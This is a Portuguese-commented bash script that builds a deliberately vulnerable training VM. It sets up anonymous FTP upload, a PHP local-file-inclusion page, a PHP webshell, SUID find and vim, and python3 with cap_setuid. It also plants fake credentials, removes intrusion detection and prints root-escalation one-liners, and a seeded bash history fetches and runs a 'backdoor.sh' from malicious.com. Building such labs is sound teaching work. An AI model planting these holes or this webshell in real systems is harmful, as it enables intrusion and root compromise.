#!/usr/bin/env bash
set -e

export DEBIAN_FRONTEND=noninteractive

echo "========================================"
echo "  Adicionando 5 Vulnerabilidades Extra  "
echo "========================================"

# ============================================
# VULNERABILIDADE 1: FTP Anônimo com Upload
# ============================================
echo ""
echo "[1/5] Configurando FTP anônimo com upload habilitado..."

apt-get install -y vsftpd

# Backup da config original
cp /etc/vsftpd.conf /etc/vsftpd.conf.bak

# Configuração INSEGURA do FTP
cat > /etc/vsftpd.conf <<'EOF'
# Configuração VULNERÁVEL - apenas para demo
listen=YES
anonymous_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
no_anon_password=YES
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
xferlog_file=/var/log/vsftpd.log
idle_session_timeout=600
data_connection_timeout=120
ftpd_banner=Welcome to Vulnerable FTP Server
chroot_local_user=YES
allow_writeable_chroot=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
pasv_enable=YES
pasv_min_port=10000
pasv_max_port=10100
EOF

# Criar diretório FTP com permissões corretas
# Raiz não-gravável (555) para evitar erro vsftpd, subdiretório gravável (777)
mkdir -p /srv/ftp/upload
chmod 555 /srv/ftp
chmod 777 /srv/ftp/upload
chown -R ftp:ftp /srv/ftp

# Criar arquivo de teste no FTP
echo "Arquivos confidenciais do sistema - ACESSO RESTRITO" > /srv/ftp/backup_database.sql
chmod 644 /srv/ftp/backup_database.sql

systemctl restart vsftpd
systemctl enable vsftpd

echo "✓ FTP anônimo configurado na porta 21"
echo "  - Upload anônimo: HABILITADO"
echo "  - Diretório: /srv/ftp/upload"

# ============================================
# VULNERABILIDADE 2: WebShell + LFI no Apache
# ============================================
echo ""
echo "[2/5] Instalando Apache com vulnerabilidade LFI..."

apt-get install -y apache2 php libapache2-mod-php

# Criar página vulnerável a LFI
cat > /var/www/html/view.php <<'EOF'
<?php
// Página VULNERÁVEL a Local File Inclusion (LFI)
// NÃO usar em produção!

$file = $_GET['file'] ?? 'index.html';

echo "<html><head><title>Sistema de Visualização</title></head><body>";
echo "<h2>Visualizador de Arquivos Internos</h2>";
echo "<hr>";

// VULNERABILIDADE: Sem sanitização de input
if (file_exists($file)) {
    echo "<pre>";
    echo htmlspecialchars(file_get_contents($file));
    echo "</pre>";
} else {
    echo "<p>Arquivo não encontrado: " . htmlspecialchars($file) . "</p>";
}

echo "</body></html>";
?>
EOF

# Criar webshell "escondida" (backdoor)
cat > /var/www/html/admin_backup.php <<'EOF'
<?php
// WebShell simples - BACKDOOR
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
EOF

# Criar arquivo com credenciais (para demonstrar impacto do LFI)
cat > /var/www/html/.env <<'EOF'
# Credenciais de banco de dados
DB_USER=admin_user
DB_PASS=Sup3rS3cr3t@2024
DB_HOST=localhost
DB_NAME=production_db
API_KEY=sk-prod-1234567890abcdefghijklmnop
EOF

# Desabilitar algumas proteções do PHP
sed -i 's/^expose_php = .*/expose_php = On/' /etc/php/*/apache2/php.ini
sed -i 's/^allow_url_include = .*/allow_url_include = On/' /etc/php/*/apache2/php.ini
sed -i 's/^display_errors = .*/display_errors = On/' /etc/php/*/apache2/php.ini

systemctl restart apache2
systemctl enable apache2

echo "✓ Apache configurado com PHP na porta 80"
echo "  - LFI: http://192.168.56.10/view.php?file=/etc/passwd"
echo "  - WebShell: http://192.168.56.10/admin_backup.php?cmd=whoami"

# ============================================
# VULNERABILIDADE 3: Binário SUID Mal Configurado
# ============================================
echo ""
echo "[3/5] Configurando binários SUID vulneráveis..."

# Copiar find com SUID (permite escalação para root via GTFOBins)
cp /usr/bin/find /usr/local/bin/backup_find
chmod 4755 /usr/local/bin/backup_find
chown root:root /usr/local/bin/backup_find

# Copiar vim com SUID (permite escalação via editor)
cp /usr/bin/vim.basic /usr/local/bin/backup_editor 2>/dev/null || cp /usr/bin/vim /usr/local/bin/backup_editor
chmod 4755 /usr/local/bin/backup_editor
chown root:root /usr/local/bin/backup_editor

# Instalar libcap2-bin para usar setcap
apt-get install -y libcap2-bin 2>/dev/null || true

# Adicionar capabilities perigosas ao python3 (permite setuid programaticamente)
PYTHON3_PATH=$(which python3)
if [ -n "$PYTHON3_PATH" ]; then
    setcap cap_setuid+ep "$PYTHON3_PATH" 2>/dev/null || true
fi

echo "✓ Binários SUID vulneráveis criados:"
echo "  - /usr/local/bin/backup_find (find com SUID root) ✓ FUNCIONAL"
echo "  - /usr/local/bin/backup_editor (vim com SUID root) ✓ FUNCIONAL"
echo "  - python3 com cap_setuid ✓ FUNCIONAL"
echo ""
echo "  Demonstração de exploração:"
echo "  • find: /usr/local/bin/backup_find . -exec /bin/sh -p \; -quit"
echo "  • vim:  /usr/local/bin/backup_editor -c ':!/bin/sh' -c ':q'"
echo "  • python: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"

# ============================================
# VULNERABILIDADE 4: Logs com Permissões Inseguras
# ============================================
echo ""
echo "[4/5] Configurando logs com permissões inseguras..."

# Tornar logs legíveis por todos
chmod 644 /var/log/auth.log 2>/dev/null || true
chmod 644 /var/log/syslog 2>/dev/null || true
chmod 755 /var/log

# Desabilitar logrotate (logs crescem indefinidamente)
systemctl stop logrotate.timer 2>/dev/null || true
systemctl disable logrotate.timer 2>/dev/null || true

# Criar log falso com credenciais expostas
cat > /var/log/app_config.log <<'EOF'
[2025-11-24 08:32:15] INFO: Application started
[2025-11-24 08:32:16] DEBUG: Database connection string: mysql://dbadmin:MyP@ssw0rd123@localhost:3306/production
[2025-11-24 08:32:17] DEBUG: API Key: sk-prod-1234567890abcdefghijklmnop
[2025-11-24 08:32:18] DEBUG: AWS Access Key: AKIAIOSFODNN7EXAMPLE
[2025-11-24 08:32:19] DEBUG: AWS Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
[2025-11-24 08:32:20] INFO: Authentication successful for user: admin
[2025-11-24 08:32:21] DEBUG: Session token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9
[2025-11-24 08:32:22] INFO: SSH private key stored at /root/.ssh/id_rsa
[2025-11-24 08:32:23] DEBUG: Root password: r00t@2024!Secure
EOF

chmod 644 /var/log/app_config.log

# Criar histórico bash com comandos sensíveis (acessível)
cat > /home/professor/.bash_history <<'EOF'
ls -la
cat /etc/shadow
mysql -u root -p'rootpass123'
ssh admin@production-server -i ~/.ssh/production_key
wget http://malicious.com/backdoor.sh
chmod +x backdoor.sh
./backdoor.sh
echo "malicious cron job" >> /etc/crontab
history -c
EOF

chmod 644 /home/professor/.bash_history
chown professor:professor /home/professor/.bash_history

# Criar arquivo de backup com senhas
cat > /var/backups/passwords_backup.txt <<'EOF'
# BACKUP DE SENHAS - CONFIDENCIAL
root:r00t@2024!Secure
professor:prof123
admin:admin@Lab2024
mysql_root:MyS3cur3P@ss!
postgres:pg_admin_2024
EOF

chmod 644 /var/backups/passwords_backup.txt

echo "✓ Logs configurados com permissões inseguras:"
echo "  - /var/log/auth.log (legível por todos)"
echo "  - /var/log/app_config.log (credenciais expostas)"
echo "  - /home/professor/.bash_history (comandos sensíveis)"
echo "  - /var/backups/passwords_backup.txt (senhas em texto claro)"

# ============================================
# VULNERABILIDADE 5: Ausência de IDS/IPS
# ============================================
echo ""
echo "[5/5] Garantindo ausência de sistemas de detecção..."

# Remover/desabilitar fail2ban se estiver instalado
systemctl stop fail2ban 2>/dev/null || true
systemctl disable fail2ban 2>/dev/null || true
apt-get remove -y fail2ban 2>/dev/null || true

# Remover AIDE se estiver instalado
apt-get remove -y aide 2>/dev/null || true

# Remover snort se estiver instalado
apt-get remove -y snort 2>/dev/null || true

# Desabilitar auditd se estiver instalado
systemctl stop auditd 2>/dev/null || true
systemctl disable auditd 2>/dev/null || true

# Configurar SSH para permitir múltiplas tentativas sem limite
cat >> /etc/ssh/sshd_config <<'EOF'

# Configurações INSEGURAS para demonstração
MaxAuthTries 999
MaxSessions 10
LoginGraceTime 600
EOF

systemctl restart ssh

echo "✓ Sistemas de detecção DESABILITADOS:"
echo "  - fail2ban: REMOVIDO"
echo "  - AIDE: REMOVIDO"
echo "  - auditd: DESABILITADO"
echo "  - SSH: Sem limite de tentativas"

# ============================================
# FINALIZAÇÃO
# ============================================
echo ""
echo "========================================"
echo "  ✓ Todas as 5 vulnerabilidades adicionadas com sucesso!"
echo "========================================"
echo ""
echo "RESUMO DAS VULNERABILIDADES:"
echo "1. FTP anônimo com upload (porta 21)"
echo "2. Apache com LFI + WebShell (porta 80)"
echo "3. Binários SUID mal configurados"
echo "4. Logs com permissões inseguras"
echo "5. Ausência de IDS/IPS"
echo ""

# Criar arquivo de status
cat > /vagrant_shared/vulnerabilities_added.txt <<EOF
Vulnerabilidades adicionadas em: $(date)

1. FTP Anônimo: vsftpd na porta 21
   - Upload habilitado em /srv/ftp/upload
   - Teste: ftp 192.168.56.10 (user: anonymous)

2. WebServer Vulnerável: Apache na porta 80
   - LFI: http://192.168.56.10/view.php?file=/etc/passwd
   - WebShell: http://192.168.56.10/admin_backup.php?cmd=id

3. SUID Binários:
   - /usr/local/bin/backup_find (escalação via GTFOBins)
   - /usr/local/bin/system_check (executa comandos como root)
   - /usr/local/bin/backup_editor (vim com SUID)

4. Logs Expostos:
   - /var/log/auth.log (r--r--r--)
   - /var/log/app_config.log (credenciais em texto claro)
   - /var/backups/passwords_backup.txt (senhas expostas)

5. Sem Proteção:
   - fail2ban: DESABILITADO
   - Tentativas SSH: ILIMITADAS
   - Port scanning: NÃO DETECTADO
EOF

echo "Status salvo em: /vagrant_shared/vulnerabilities_added.txt"
